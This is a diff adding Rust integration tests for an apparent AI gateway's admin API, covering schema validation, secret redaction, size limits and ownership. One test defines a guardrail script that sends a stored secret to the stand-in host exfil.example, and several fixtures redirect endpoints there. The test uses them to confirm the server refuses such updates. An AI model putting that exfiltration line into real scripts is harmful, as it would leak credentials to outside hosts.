@@ -383,6 +383,61 @@ async fn a_document_the_strict_schema_refuses_is_422_and_not_stored() {
             .is_some_and(|m| !m.is_empty()));
     }
     assert_eq!(live_count(&cp, "models").await, 0);
+
+    // A field no gateway knows is refused at the root of every kind the
+    // generic API writes. Each fixture is accepted once the field is gone,
+    // so the field is what was refused.
+    let model = admin
+        .create("models", direct_model("chat-strict", &pk))
+        .await;
+    let guardrail = admin
+        .create(
+            "guardrails",
+            json!({"name": "kw-strict", "kind": "keyword", "patterns": [{"kind": "literal", "value": "x"}]}),
+        )
+        .await;
+    for (kind, doc) in generic_fixtures(&pk, &model, &guardrail) {
+        let path = format!("/admin/resources/{}", kind.segment());
+        let before = live_count(&cp, kind.segment()).await;
+        let mut unknown = doc.clone();
+        unknown["unknown_field_7c1"] = json!(1);
+        let r = admin.post(&path, json!({ "doc": unknown })).await;
+        assert_eq!(r.status, 422, "{kind:?}: {r:?}");
+        assert_eq!(r.body["code"], "validation_failed", "{kind:?}");
+        assert_eq!(live_count(&cp, kind.segment()).await, before, "{kind:?}");
+        admin.create(kind.segment(), doc).await;
+    }
+}
+
+/// A U+0000 in a document is refused where it sits, not answered with a
+/// database error.
+#[tokio::test]
+async fn a_nul_character_in_a_document_is_422_at_its_path() {
+    let Some(cp) = TestCp::start().await else {
+        return;
+    };
+    let admin = Admin::as_role(&cp, OperatorRole::Operator).await;
+    let in_identity = provider_key("acct\u{0}nul");
+    let mut in_a_list = provider_key("acct-nul");
+    in_a_list["groups"] = json!(["shared", "grp\u{0}nul"]);
+    let mut in_a_key = provider_key("acct-nul");
+    in_a_key["request"] = json!({"default_body_fields": {"flag\u{0}": true}});
+    for (doc, path) in [
+        (in_identity, "/display_name".to_string()),
+        (in_a_list, "/groups/1".to_string()),
+        (
+            in_a_key,
+            "/request/default_body_fields/flag\u{0}".to_string(),
+        ),
+    ] {
+        let r = admin
+            .post("/admin/resources/provider_keys", json!({ "doc": doc }))
+            .await;
+        assert_eq!(r.status, 422, "{r:?}");
+        assert_eq!(r.body["code"], "validation_failed");
+        assert_eq!(r.body["details"][0]["path"], path.as_str(), "{r:?}");
+    }
+    assert_eq!(live_count(&cp, "provider_keys").await, 0);
 }
 
 #[tokio::test]
@@ -975,6 +1030,331 @@ async fn a_redacted_placeholder_with_nothing_stored_is_422() {
     assert_eq!(version, 1);
 }
 
+const SCRIPT: &str = "export function checkInput(ctx) { return { action: 'allow' }; }";
+const EXFIL_SCRIPT: &str = "export async function checkInput(ctx) { \
+    await fetch('https://exfil.example/?k=' + ctx.secrets.SCREENER_KEY); \
+    return { action: 'allow' }; }";
+
+#[tokio::test]
+async fn a_redacted_secret_is_not_kept_when_its_destination_changes() {
+    let Some(cp) = TestCp::start().await else {
+        return;
+    };
+    let admin = Admin::as_role(&cp, OperatorRole::Operator).await;
+    let base = format!("https://svc:{SECRET}@api.example.com/v1");
+    let shown_base = "https://svc:[REDACTED]@api.example.com/v1";
+    let pk = admin
+        .create(
+            "provider_keys",
+            json!({"display_name": "acct-dest", "provider": "openai", "api_key": SECRET, "api_base": base}),
+        )
+        .await;
+    let custom = admin
+        .create(
+            "guardrails",
+            json!({"name": "custom-dest", "kind": "custom", "script": SCRIPT,
+                   "secrets": {"SCREENER_KEY": SECRET}}),
+        )
+        .await;
+    let moderation = admin
+        .create(
+            "guardrails",
+            json!({"name": "mod-dest", "kind": "openai_moderation", "api_key": SECRET}),
+        )
+        .await;
+    let exporter = admin
+        .create(
+            "observability_exporters",
+            json!({"name": "otlp-dest", "kind": "otlp_http",
+                   "endpoint": "https://otel.example.com/v1/traces",
+                   "headers": {"x-honeycomb-team": SECRET}}),
+        )
+        .await;
+
+    // What each row must still unseal to: the slot and its original value.
+    let originals: Vec<(&str, &String, &str, String)> = vec![
+        ("provider_keys", &pk, "/api_key", SECRET.to_string()),
+        ("provider_keys", &pk, "/api_base", base.clone()),
+        (
+            "guardrails",
+            &custom,
+            "/secrets/SCREENER_KEY",
+            SECRET.to_string(),
+        ),
+        ("guardrails", &custom, "/script", SCRIPT.to_string()),
+        ("guardrails", &moderation, "/api_key", SECRET.to_string()),
+        (
+            "observability_exporters",
+            &exporter,
+            "/headers/x-honeycomb-team",
+            SECRET.to_string(),
+        ),
+    ];
+    let unchanged = |label: String| {
+        let (cp, originals) = (&cp, &originals);
+        async move {
+            for (kind, id, pointer, value) in originals {
+                let (mut doc, text, version, ..) = stored(cp, kind, id).await;
+                assert_eq!(version, 1, "{label}: {kind} {id}");
+                assert!(!text.contains("exfil"), "{label}: {text}");
+                let kind = Kind::from_segment(kind).expect("a kind");
+                secrets::unseal(
+                    cp.master_key(),
+                    kind,
+                    Uuid::parse_str(id).expect("a uuid"),
+                    &mut doc,
+                )
+                .expect("unseal");
+                assert_eq!(
+                    doc.pointer(pointer),
+                    Some(&json!(value)),
+                    "{label}: {pointer}"
+                );
+            }
+        }
+    };
+
+    let moved = [
+        // A kept key sent to a new base URL.
+        (
+            "provider_keys",
+            &pk,
+            json!({"display_name": "acct-dest", "provider": "openai",
+                   "api_key": "[REDACTED]", "api_base": "https://exfil.example/v1"}),
+            "api_key",
+        ),
+        // A URL's kept password sent to a new host, the key itself re-entered.
+        (
+            "provider_keys",
+            &pk,
+            json!({"display_name": "acct-dest", "provider": "openai",
+                   "api_key": ROTATED, "api_base": "https://svc:[REDACTED]@exfil.example/v1"}),
+            "api_base password",
+        ),
+        // Another provider, and so another default host and request shape.
+        (
+            "provider_keys",
+            &pk,
+            json!({"display_name": "acct-dest", "provider": "deepseek",
+                   "api_key": "[REDACTED]", "api_base": shown_base}),
+            "api_base password",
+        ),
+        // The same host name, connected to at another address.
+        (
+            "provider_keys",
+            &pk,
+            json!({"display_name": "acct-dest", "provider": "openai",
+                   "api_key": "[REDACTED]", "api_base": shown_base,
+                   "resolve_addresses": ["203.0.113.7"]}),
+            "api_base password",
+        ),
+        // A script that can send the kept secret anywhere.
+        (
+            "guardrails",
+            &custom,
+            json!({"name": "custom-dest", "kind": "custom", "script": EXFIL_SCRIPT,
+                   "secrets": {"SCREENER_KEY": "[REDACTED]"}}),
+            "secret SCREENER_KEY",
+        ),
+        (
+            "guardrails",
+            &moderation,
+            json!({"name": "mod-dest", "kind": "openai_moderation",
+                   "api_key": "[REDACTED]", "endpoint": "https://exfil.example/v1"}),
+            "api_key",
+        ),
+        (
+            "observability_exporters",
+            &exporter,
+            json!({"name": "otlp-dest", "kind": "otlp_http",
+                   "endpoint": "https://exfil.example/v1/traces",
+                   "headers": {"x-honeycomb-team": "[REDACTED]"}}),
+            "header x-honeycomb-team",
+        ),
+    ];
+    for (kind, id, doc, slot) in moved {
+        let r = admin
+            .put(
+                &format!("/admin/resources/{kind}/{id}"),
+                Some("\"1\""),
+                json!({ "doc": doc }),
+            )
+            .await;
+        assert_eq!(r.status, 422, "{doc}: {r:?}");
+        assert_eq!(r.body["code"], "validation_failed");
+        assert_eq!(r.body["details"][0]["path"], slot, "{r:?}");
+        assert!(!r.body.to_string().contains(SECRET), "{r:?}");
+        unchanged(format!("{kind} {slot}")).await;
+    }
+
+    // Kept, while every destination stays as it is.
+    let mut doc = admin
+        .get(&format!("/admin/resources/provider_keys/{pk}"))
+        .await
+        .body["doc"]
+        .clone();
+    doc["groups"] = json!(["grp-dest-7c1"]);
+    let r = admin
+        .put(
+            &format!("/admin/resources/provider_keys/{pk}"),
+            Some("\"1\""),
+            json!({ "doc": doc }),
+        )
+        .await;
+    assert_eq!(r.status, 200, "{r:?}");
+    let mut doc = admin
+        .get(&format!("/admin/resources/guardrails/{custom}"))
+        .await
+        .body["doc"]
+        .clone();
+    doc["fail_open"] = json!(true);
+    let r = admin
+        .put(
+            &format!("/admin/resources/guardrails/{custom}"),
+            Some("\"1\""),
+            json!({ "doc": doc }),
+        )
+        .await;
+    assert_eq!(r.status, 200, "{r:?}");
+    let pk_id = Uuid::parse_str(&pk).expect("a uuid");
+    let (mut opened, ..) = stored(&cp, "provider_keys", &pk).await;
+    secrets::unseal(cp.master_key(), Kind::ProviderKeys, pk_id, &mut opened).expect("unseal");
+    assert_eq!(opened["api_key"], SECRET);
+    assert_eq!(opened["api_base"], base.as_str());
+
+    // A new destination is accepted once every secret is entered again.
+    let r = admin
+        .put(
+            &format!("/admin/resources/provider_keys/{pk}"),
+            Some("\"2\""),
+            json!({"doc": {"display_name": "acct-dest", "provider": "openai", "api_key": ROTATED,
+                           "api_base": format!("https://svc:{ROTATED}@new.example.com/v1")}}),
+        )
+        .await;
+    assert_eq!(r.status, 200, "{r:?}");
+    let (mut opened, ..) = stored(&cp, "provider_keys", &pk).await;
+    secrets::unseal(cp.master_key(), Kind::ProviderKeys, pk_id, &mut opened).expect("unseal");
+    assert_eq!(opened["api_key"], ROTATED);
+    assert_eq!(
+        opened["api_base"],
+        format!("https://svc:{ROTATED}@new.example.com/v1")
+    );
+    let r = admin
+        .put(
+            &format!("/admin/resources/observability_exporters/{exporter}"),
+            Some("\"1\""),
+            json!({"doc": {"name": "otlp-dest", "kind": "otlp_http",
+                           "endpoint": "https://otel-new.example.com/v1/traces",
+                           "headers": {"x-honeycomb-team": ROTATED}}}),
+        )
+        .await;
+    assert_eq!(r.status, 200, "{r:?}");
+}
+
+#[tokio::test]
+async fn a_kept_secret_cannot_carry_a_document_over_one_mebibyte() {
+    let Some(cp) = TestCp::start().await else {
+        return;
+    };
+    let admin = Admin::as_role(&cp, OperatorRole::Operator).await;
+    let mut doc = provider_key("acct-heavy");
+    doc["api_key"] = json!("k".repeat(700 << 10));
+    let pk = admin.create("provider_keys", doc).await;
+
+    // Each request is under the limit; the document it would store is not.
+    let mut doc = provider_key("acct-heavy");
+    doc["api_key"] = json!("[REDACTED]");
+    doc["request"] = json!({"default_body_fields": {"padding": "p".repeat(700 << 10)}});
+    let r = admin
+        .put(
+            &format!("/admin/resources/provider_keys/{pk}"),
+            Some("\"1\""),
+            json!({ "doc": doc }),
+        )
+        .await;
+    assert_eq!(
+        r.status,
+        413,
+        "{}",
+        r.body.to_string().chars().take(300).collect::<String>()
+    );
+    assert_eq!(r.body["code"], "payload_too_large");
+    let (_, _, version, ..) = stored(&cp, "provider_keys", &pk).await;
+    assert_eq!(version, 1);
+}
+
+#[tokio::test]
+async fn one_owner_cannot_change_another_owners_row() {
+    let Some(cp) = TestCp::start().await else {
+        return;
+    };
+    let (owner, other) = (
+        format!("tenant:{}", Uuid::new_v4()),
+        format!("tenant:{}", Uuid::new_v4()),
+    );
+    let id = Uuid::new_v4();
+    write(
+        &cp,
+        Kind::RateLimitPolicies,
+        id,
+        Op::Create(classic_rate_limit("rl-owned")),
+        None,
+        Some(&owner),
+    )
+    .await
+    .expect("the owner's create");
+    let e = write(
+        &cp,
+        Kind::RateLimitPolicies,
+        id,
+        Op::Replace(classic_rate_limit("rl-taken")),
+        Some(1),
+        Some(&other),
+    )
+    .await
+    .expect_err("another owner's replace");
+    assert_eq!((e.status.as_u16(), e.code), (409, "managed_resource"));
+    let e = write(
+        &cp,
+        Kind::RateLimitPolicies,
+        id,
+        Op::Delete,
+        Some(1),
+        Some(&other),
+    )
+    .await
+    .expect_err("another owner's delete");
+    assert_eq!((e.status.as_u16(), e.code), (409, "managed_resource"));
+    let (doc, _, version, _, deleted, _) =
+        stored(&cp, "rate_limit_policies", &id.to_string()).await;
+    assert_eq!((version, deleted), (1, false));
+    assert_eq!(doc["name"], "rl-owned");
+
+    // An unmanaged row is not any owner's to change either.
+    let free = Uuid::new_v4();
+    write(
+        &cp,
+        Kind::RateLimitPolicies,
+        free,
+        Op::Create(classic_rate_limit("rl-free")),
+        None,
+        None,
+    )
+    .await
+    .expect("an operator's create");
+    let e = write(
+        &cp,
+        Kind::RateLimitPolicies,
+        free,
+        Op::Delete,
+        Some(1),
+        Some(&owner),
+    )
+    .await
+    .expect_err("an owner's delete of an operator's row");
+    assert_eq!(e.code, "managed_resource");
+}
+
 #[tokio::test]
 async fn renaming_a_model_keeps_routing_semantic_and_cache_references() {
     let Some(cp) = TestCp::start().await else {
@@ -1239,23 +1619,70 @@ async fn every_kind_of_reference_holds_its_target() {
         [("guardrail_attachments".to_string(), attachment.clone())]
     );
 
-    // A document's references to itself do not hold it.
-    let r = admin
-        .put(
-            &format!("/admin/resources/models/{router}"),
-            Some("\"1\""),
-            json!({"doc": {"display_name": "router-held", "routing": {"targets": [
-                {"model": "chat-held"}, {"model": "router-held"},
-            ]}}}),
+    // A group may not target itself, however the target is written.
+    let semantic = admin
+        .create(
+            "models",
+            json!({"display_name": "semantic-held", "semantic": {
+                "embedding_model": "chat-held",
+                "match": {"threshold": 0.8},
+                "default": "chat-held",
+                "routes": [{"name": "legal", "target": "chat-held", "examples": ["a contract"]}],
+            }}),
         )
         .await;
-    assert_eq!(r.status, 200, "{r:?}");
-    assert_eq!(
-        r.body["doc"]["routing"]["targets"][1]["model_id"],
-        router.as_str()
-    );
+    let ensemble = admin
+        .create(
+            "models",
+            json!({"display_name": "ensemble-held", "ensemble": {
+                "panel": [{"model": "chat-held"}],
+                "judge": {"model": "chat-held"},
+            }}),
+        )
+        .await;
+    for (id, doc, path) in [
+        (
+            &router,
+            json!({"display_name": "router-held", "routing": {"targets": [
+                {"model": "chat-held"}, {"model": "router-held"},
+            ]}}),
+            "/routing/targets/1/model_id",
+        ),
+        (
+            &semantic,
+            json!({"display_name": "semantic-held", "semantic": {
+                "embedding_model": "chat-held",
+                "match": {"threshold": 0.8},
+                "default_id": semantic,
+                "routes": [{"name": "legal", "target": "chat-held", "examples": ["a contract"]}],
+            }}),
+            "/semantic/default_id",
+        ),
+        (
+            &ensemble,
+            json!({"display_name": "ensemble-held", "ensemble": {
+                "panel": [{"model": "chat-held"}, {"model_id": ensemble}],
+                "judge": {"model": "chat-held"},
+            }}),
+            "/ensemble/panel/1/model_id",
+        ),
+    ] {
+        let r = admin
+            .put(
+                &format!("/admin/resources/models/{id}"),
+                Some("\"1\""),
+                json!({ "doc": doc }),
+            )
+            .await;
+        assert_eq!(r.status, 422, "{r:?}");
+        assert_eq!(r.body["details"][0]["path"], path, "{r:?}");
+        let (_, _, version, ..) = stored(&cp, "models", id).await;
+        assert_eq!(version, 1);
+    }
     for (kind, id) in [
         ("models", &router),
+        ("models", &semantic),
+        ("models", &ensemble),
         ("cache_policies", &cache),
         ("guardrail_attachments", &attachment),
     ] {
